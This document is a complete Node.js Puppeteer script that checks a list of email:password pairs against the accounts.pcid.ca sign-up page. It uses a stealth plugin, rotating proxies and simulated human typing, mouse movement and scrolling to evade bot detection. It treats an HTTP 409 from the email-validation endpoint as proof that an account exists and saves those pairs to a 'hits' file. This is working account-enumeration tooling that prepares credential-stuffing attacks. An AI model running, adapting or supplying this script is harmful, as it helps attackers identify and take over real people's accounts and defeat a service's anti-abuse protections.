// Import Statements (ES Module Syntax)
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import fs from "fs";
import path, { dirname } from "path";
import os from "os";
import pLimit from "p-limit";
import { fileURLToPath } from "url";

// __filename and __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Use Stealth plugin to evade detection
puppeteer.use(StealthPlugin());

/**
 * Configuration Section
 */

// Define your proxies here. Use the format [username:password@]ip:port
const PROXIES = [
  // "username:password@192.168.1.100:8080",
  // "192.168.1.101:8080",
  // Add more proxies as needed
];

// Set to `true` to enable proxy rotation, `false` to disable
const USE_PROXIES = PROXIES.length > 0;

// Maximum number of browser instances to launch or `null`
// Set to a reasonable number based on your system's capability
const MAX_BROWSERS = 3; // Adjust as needed

// Path to the emails file
const EMAILS_FILE = path.join(__dirname, "emails.txt");

// Path to save valid email:password pairs
const HITS_FILE = path.join(__dirname, "PCID", "PCID Hits.txt");

/**
 * Utility Functions
 */

/**
 * Reads a list of emails and passwords from a file.
 * Expected format per line: email:password
 * @param {string} filePath - Path to the email list file.
 * @returns {Array<{email: string, password: string}>}
 */
function readEmailListFromFile(filePath) {
  try {
    const data = fs.readFileSync(filePath, "utf8");
    return data
      .split(/\r?\n/)
      .filter((line) => line.includes(":") && !line.trim().startsWith("#"))
      .map((line) => {
        const [email, password] = line.split(":");
        return { email: email.trim(), password: password.trim() };
      });
  } catch (error) {
    console.error(`Error reading file ${filePath}:`, error);
    return [];
  }
}

/**
 * Ensures that the directory for the given file path exists.
 * Creates directories recursively if they do not exist.
 * @param {string} filePath - Path to the file.
 */
function ensureDirectoryExistence(filePath) {
  const dirname = path.dirname(filePath);
  if (!fs.existsSync(dirname)) {
    fs.mkdirSync(dirname, { recursive: true });
    console.log(`Created directory: ${dirname}`);
  }
}

/**
 * Simulates human-like typing into an input field.
 * @param {object} page - Puppeteer page instance.
 * @param {string} selector - CSS selector for the input field.
 * @param {string} text - Text to type.
 */
async function humanType(page, selector, text) {
  const element = await page.$(selector);
  if (element) {
    for (let character of text) {
      await element.type(character, { delay: getRandomInt(100, 200) });
      // Introduce random pauses to mimic human behavior
      if (Math.random() < 0.05) {
        // 5% chance
        await delay(getRandomInt(500, 1500));
      }
    }
    console.log(`Typed email: ${text}`);
  } else {
    console.warn(`Selector ${selector} not found for human typing.`);
  }
}

/**
 * Clears the email input field using either select-all or backspace method.
 * @param {object} page - Puppeteer page instance.
 */
async function clearEmailInput(page) {
  const element = await page.$('input[id="email"]');
  if (element) {
    const method = Math.random() < 0.5 ? "selectall" : "backspace";
    if (method === "selectall") {
      await element.click({ clickCount: 3 });
      await element.press("Backspace");
      console.log("Cleared email input using select-all method.");
    } else {
      const value = await page.$eval('input[id="email"]', (el) => el.value);
      for (let i = 0; i < value.length; i++) {
        await element.press("Backspace", { delay: getRandomInt(50, 150) });
      }
      console.log("Cleared email input using backspace method.");
    }
  } else {
    console.warn("Email input field not found for clearing.");
  }
}

/**
 * Smoothly moves the mouse from a starting point to an ending point.
 * @param {object} page - Puppeteer page instance.
 * @param {number} startX - Starting X coordinate.
 * @param {number} startY - Starting Y coordinate.
 * @param {number} endX - Ending X coordinate.
 * @param {number} endY - Ending Y coordinate.
 * @param {number} steps - Number of steps for the movement.
 */
async function smoothMouseMove(page, startX, startY, endX, endY, steps = 25) {
  const deltaX = (endX - startX) / steps;
  const deltaY = (endY - startY) / steps;

  for (let i = 0; i < steps; i++) {
    await page.mouse.move(
      startX + deltaX * i + getRandomInt(-5, 5),
      startY + deltaY * i + getRandomInt(-5, 5)
    );
    await delay(getRandomInt(20, 60));
  }
  console.log("Performed smooth mouse movement.");
}

/**
 * Performs a random scroll action on the page.
 * @param {object} page - Puppeteer page instance.
 */
async function randomScroll(page) {
  const distance = Math.floor(Math.random() * 1000) + 200;
  await page.evaluate((distance) => window.scrollBy(0, distance), distance);
  await delay(Math.floor(Math.random() * 2000) + 500);
  console.log(`Scrolled by ${distance} pixels.`);
}

/**
 * Generates a random integer between min and max (inclusive).
 * @param {number} min - Minimum integer.
 * @param {number} max - Maximum integer.
 * @returns {number}
 */
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

/**
 * Returns a promise that resolves after a specified delay.
 * @param {number} ms - Milliseconds to delay.
 * @returns {Promise<void>}
 */
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Simulates human-like random mouse movements on the page.
 * @param {object} page - Puppeteer page instance.
 */
async function randomMouseMovements(page) {
  const width = await page.evaluate(() => document.body.clientWidth);
  const height = await page.evaluate(() => document.body.clientHeight);
  const startX = Math.random() * width;
  const startY = Math.random() * height;
  const endX = Math.random() * width;
  const endY = Math.random() * height;
  await smoothMouseMove(page, startX, startY, endX, endY);
}

/**
 * Launches a Puppeteer browser instance with retry logic and optional proxy support.
 * @param {string|null} proxy - Proxy string in the format [username:password@]ip:port or null for no proxy.
 * @param {number} maxRetries - Maximum number of launch attempts.
 * @returns {object} - Puppeteer browser instance.
 */
async function launchBrowserWithRetry(proxy, maxRetries = 3) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(
        `Launching browser${
          proxy ? ` with proxy ${proxy}` : ""
        } (Attempt ${attempt}/${maxRetries})...`
      );
      const launchOptions = {
        headless: false, // Set to false to see the browser
        args: ["--no-sandbox", "--disable-setuid-sandbox"],
        ignoreHTTPSErrors: true,
      };

      if (proxy) {
        const proxyUrl = proxy.includes("@") ? proxy.split("@")[1] : proxy;
        launchOptions.args.push(`--proxy-server=${proxyUrl}`);
        console.log(`Proxy server set to: ${proxyUrl}`);
      }

      const browser = await puppeteer.launch(launchOptions);

      // Optional: Listen to console messages from the page
      // const page = await browser.newPage(); // Removed as per your comment
      // page.on("console", (msg) => console.log(`PAGE LOG: ${msg.text()}`));
      // page.on("pageerror", (error) => console.log(`PAGE ERROR: ${error}`));

      if (proxy && proxy.includes("@")) {
        // If proxy requires authentication
        const [credentials, proxyHost] = proxy.split("@");
        const [username, password] = credentials.split(":");
        const page = await browser.newPage();
        await page.authenticate({ username, password });
        console.log(`Authenticated with proxy: ${username}:${password}`);
      }

      console.log("Browser launched successfully.");
      addActiveBrowser(browser); // Track the browser instance
      return browser;
    } catch (error) {
      console.error(
        `Launch attempt ${attempt} failed: ${error.message}. Retrying in 3 seconds...`
      );
      await delay(3000);
    }
  }
  throw new Error(`Failed to launch browser after ${maxRetries} attempts.`);
}

/**
 * Processes a single email and password pair.
 * @param {string} email - Email address.
 * @param {string} password - Password.
 * @param {string|null} proxy - Proxy string to use for this task or null for no proxy.
 * @param {number} attempt - Current attempt number.
 * @returns {Promise<string>} - Outcome of the processing ('success', 'fail', 'unknown', 'error').
 */
async function processEmail(email, password, proxy, attempt = 1) {
  let browser;
  try {
    console.log(`Processing email: ${email} (Attempt ${attempt}/3)`);
    browser = await launchBrowserWithRetry(proxy);
    const pages = await browser.pages();
    const page = pages.length > 0 ? pages[0] : await browser.newPage(); // Use the first page

    // Set up request interception
    await setupRequestInterception(page);
    await page.setCacheEnabled(true);

    // Set random viewport size to mimic different devices
    const viewportWidth = getRandomInt(800, 1200);
    const viewportHeight = getRandomInt(600, 900);
    await page.setViewport({
      width: viewportWidth,
      height: viewportHeight,
    });
    console.log(`Viewport set to ${viewportWidth}x${viewportHeight}.`);

    // Perform random mouse movements to simulate user activity
    await randomMouseMovements(page);

    console.log(
      `Navigating to https://accounts.pcid.ca/create-account for email: ${email}${
        proxy ? ` using proxy: ${proxy}` : ""
      }...`
    );
    await page.goto("https://accounts.pcid.ca/create-account", {
      waitUntil: "domcontentloaded",
      timeout: 30000,
    });
    console.log("Page loaded.");

    try {
      await page.waitForSelector('input[id="email"]', { timeout: 10000 });
      console.log("Email input field found.");
    } catch (error) {
      console.error(
        "Email input field not found, attempting to fix the loading issue..."
      );

      // Attempt to locate and double-click the "Loading" element to possibly trigger the form
      const loadingElements = await page.$x('//*[@id="__next"]/div/span');
      if (loadingElements.length > 0) {
        const element = loadingElements[0];
        const boundingBox = await element.boundingBox();
        if (boundingBox) {
          // Move the mouse to the center of the loading element and double-click
          const centerX = boundingBox.x + boundingBox.width / 2;
          const centerY = boundingBox.y + boundingBox.height / 2;
          await smoothMouseMove(page, centerX, centerY, centerX, centerY);
          await page.mouse.click(centerX, centerY, { clickCount: 2 });
          console.log('Double-clicked on the "Loading" text.');

          // Refresh the page and wait for the email input again
          await page.reload({ waitUntil: "domcontentloaded", timeout: 30000 });
          console.log("Page reloaded.");
          await page.waitForSelector('input[id="email"]', { timeout: 10000 });
          console.log("Email input field found after reload.");
        } else {
          console.error("Unable to get bounding box of the loading element.");
          throw new Error("Failed to double-click the Loading element.");
        }
      } else {
        console.error("Loading element not found.");
        throw new Error("Loading element not found.");
      }
    }

    // Perform random scroll to mimic user behavior
    await randomScroll(page);

    // Clear any existing text in the email input field
    await clearEmailInput(page);

    // Random delay before typing
    await delay(getRandomInt(2220, 3333));

    // Set up a promise to wait for the 'validate-email' response
    const validateEmailResponsePromise = page
      .waitForResponse(
        (response) =>
          response.url() === "https://accounts.pcid.ca/validate-email" &&
          (response.status() === 204 || response.status() === 409),
        { timeout: 15000 }
      )
      .catch(() => null);

    // Type the email in a human-like manner
    await humanType(page, 'input[id="email"]', email);

    // Optionally, trigger the email validation by blurring the input
    await page.focus("body"); // Focus elsewhere to trigger any onblur events

    // Wait for the 'validate-email' response
    const response = await validateEmailResponsePromise;

    if (!response) {
      throw new Error("Response timed out or not received.");
    }

    const status = response.status();
    let responseBody;
    try {
      responseBody = await response.json();
    } catch (jsonError) {
      const text = await response.text();
      responseBody = text
        ? { error: "unknown_response" }
        : { error: "empty_response" };
    }

    console.log(`Response status: ${status}`);
    console.log(`Response body: ${JSON.stringify(responseBody)}`);

    // Close the browser after processing
    await browser.close();
    removeActiveBrowser(browser); // Remove from tracking
    console.log("Browser closed.");

    // Determine outcome based on response
    if (status === 409) {
      // 409 indicates email is valid (already exists)
      saveHit(email, password);
      return "success";
    } else if (status === 204) {
      // 204 indicates email is invalid (does not exist)
      return "fail";
    } else {
      return "unknown";
    }
  } catch (error) {
    console.error(
      `Error during processing email ${email}${
        proxy ? ` with proxy ${proxy}` : ""
      } (Attempt ${attempt}/3):`,
      error.message
    );

    // If the error is proxy-related, mark the proxy as bad
    if (proxy && isProxyError(error)) {
      markProxyAsBad(proxy);
      console.log(`Marked proxy ${proxy} as bad. It will no longer be used.`);
    }

    // Close the browser if it's still open
    if (browser) {
      try {
        await browser.close();
        removeActiveBrowser(browser); // Remove from tracking
        console.log("Browser closed after error.");
      } catch (closeError) {
        console.error("Error closing browser:", closeError);
      }
    }

    if (attempt < 3) {
      console.log(
        `Retrying email ${email}${
          proxy ? ` with a different proxy` : ""
        } (Attempt ${attempt + 1}/3)...`
      );
      const newProxy = getNextProxy();
      if (proxy && newProxy === proxy) {
        // Avoid retrying with the same bad proxy
        console.log(
          "Selected proxy is marked as bad. Selecting a different proxy..."
        );
        return await processEmail(email, password, getNextProxy(), attempt + 1);
      }
      return await processEmail(email, password, newProxy, attempt + 1);
    } else {
      console.error(`Failed to process email ${email} after 3 attempts.`);
      return "error";
    }
  }
}

/**
 * Determines if an error is proxy-related based on the error message.
 * @param {Error} error
 * @returns {boolean}
 */
function isProxyError(error) {
  const proxyErrorMessages = [
    "net::ERR_PROXY_CONNECTION_FAILED",
    "net::ERR_PROXY_AUTH_REQUESTED",
    "net::ERR_CONNECTION_TIMED_OUT",
    "net::ERR_CONNECTION_REFUSED",
    "net::ERR_TUNNEL_CONNECTION_FAILED",
    "Authentication required",
  ];
  return proxyErrorMessages.some((msg) => error.message.includes(msg));
}

/**
 * Saves successful email and password pairs to a designated file.
 * @param {string} email - Email address.
 * @param {string} password - Password.
 */
function saveHit(email, password) {
  ensureDirectoryExistence(HITS_FILE);
  fs.appendFileSync(HITS_FILE, `${email}:${password}\n`);
  console.log(`Saved valid email: ${email}`);
}

/**
 * Sets up request interception to block unnecessary resources and tracking scripts.
 * @param {object} page - Puppeteer page instance.
 */
async function setupRequestInterception(page) {
  await page.setRequestInterception(true);
  page.on("request", (req) => {
    const resourceType = req.resourceType();
    const url = req.url().toLowerCase();

    // Define resource types and domains to block
    const blockedResources = [
      "image",
      "stylesheet",
      "font",
      "media",
      "other",
      "fetch",
    ];

    const blockedDomains = [
      "doubleclick.net",
      "googlesyndication.com",
      "google-analytics.com",
      "ads.",
      "tracking.",
      "analytics.",
      // Add more domains as needed
    ];

    // Abort requests for blocked resource types or domains
    if (
      blockedResources.includes(resourceType) ||
      blockedDomains.some((domain) => url.includes(domain))
    ) {
      req.abort();
    } else {
      req.continue();
    }
  });
}

/**
 * Proxy Management Variables
 */
let proxies = USE_PROXIES ? [...PROXIES] : [];
let badProxies = new Set();
let proxyIndex = 0;

/**
 * Retrieves the next available proxy using round-robin selection.
 * @returns {string|null} - Proxy string or null if none available.
 */
function getNextProxy() {
  if (!USE_PROXIES || proxies.length === 0) return null;
  const proxy = proxies[proxyIndex % proxies.length];
  proxyIndex += 1;
  return proxy;
}

/**
 * Marks a proxy as bad and removes it from the available proxies list.
 * @param {string} proxy - Proxy string to mark as bad.
 */
function markProxyAsBad(proxy) {
  badProxies.add(proxy);
  proxies = proxies.filter((p) => p !== proxy);
  console.log(`Proxy ${proxy} marked as bad and removed from the pool.`);
}

/**
 * Keeps track of all launched browser instances for graceful shutdown.
 */
const activeBrowsers = new Set();

/**
 * Adds a browser instance to the activeBrowsers set.
 * @param {object} browser - Puppeteer browser instance.
 */
function addActiveBrowser(browser) {
  activeBrowsers.add(browser);
}

/**
 * Removes a browser instance from the activeBrowsers set.
 * @param {object} browser - Puppeteer browser instance.
 */
function removeActiveBrowser(browser) {
  activeBrowsers.delete(browser);
}

/**
 * Closes all active browser instances.
 */
async function closeAllBrowsers() {
  console.log("\nClosing all browser instances...");
  for (const browser of activeBrowsers) {
    try {
      await browser.close();
      console.log("Browser closed.");
    } catch (error) {
      console.error("Error closing browser:", error);
    }
  }
  activeBrowsers.clear();
}

/**
 * Main execution function.
 */
(async () => {
  // Handle shutdown signals to gracefully close browsers
  process.on("SIGINT", async () => {
    console.log("\nReceived SIGINT. Shutting down...");
    await closeAllBrowsers();
    process.exit(0);
  });

  process.on("SIGTERM", async () => {
    console.log("\nReceived SIGTERM. Shutting down...");
    await closeAllBrowsers();
    process.exit(0);
  });

  // Read the list of emails and passwords
  const emailList = readEmailListFromFile(EMAILS_FILE);

  if (emailList.length === 0) {
    console.error("No valid email entries found in emails.txt.");
    process.exit(1);
  }

  // Determine the number of concurrent tasks based on CPU cores and proxies
  const cpuCount = os.cpus().length;
  const autoConcurrency = cpuCount > 1 ? cpuCount - 1 : 1; // Reserve one core
  const definedConcurrency = MAX_BROWSERS || autoConcurrency;
  const availableConcurrency = USE_PROXIES
    ? Math.min(definedConcurrency, proxies.length)
    : definedConcurrency;
  const limit = pLimit(availableConcurrency);

  console.log(
    `Starting processing with concurrency level: ${availableConcurrency}`
  );
  if (USE_PROXIES) {
    console.log(`Total Proxies Available: ${proxies.length}`);
  } else {
    console.log("Running without proxies.");
  }

  // Create an array of promise-returning functions with concurrency control
  const tasks = emailList.map(({ email, password }) =>
    limit(async () => {
      const proxy = getNextProxy();
      console.log(`Assigned proxy for ${email}: ${proxy || "No Proxy"}`);
      return await processEmail(email, password, proxy);
    })
  );

  // Execute all tasks
  console.log("Executing tasks...");
  const results = await Promise.all(tasks);
  console.log("All tasks completed.");

  // Log the summary
  const successCount = results.filter((result) => result === "success").length;
  const failCount = results.filter((result) => result === "fail").length;
  const errorCount = results.filter((result) => result === "error").length;
  const unknownCount = results.filter((result) => result === "unknown").length;

  console.log("\n=== Processing Summary ===");
  console.log(`Total Emails Processed: ${results.length}`);
  console.log(`Valid Emails (409): ${successCount}`);
  console.log(`Invalid Emails (204): ${failCount}`);
  console.log(`Errors: ${errorCount}`);
  console.log(`Unknown Outcomes: ${unknownCount}`);

  // Optionally, list bad proxies
  if (badProxies.size > 0 && USE_PROXIES) {
    console.log("\n=== Bad Proxies ===");
    badProxies.forEach((proxy) => console.log(proxy));
  }

  // Close all browsers after processing
  await closeAllBrowsers();

  // Exit the process
  process.exit(0);
})();
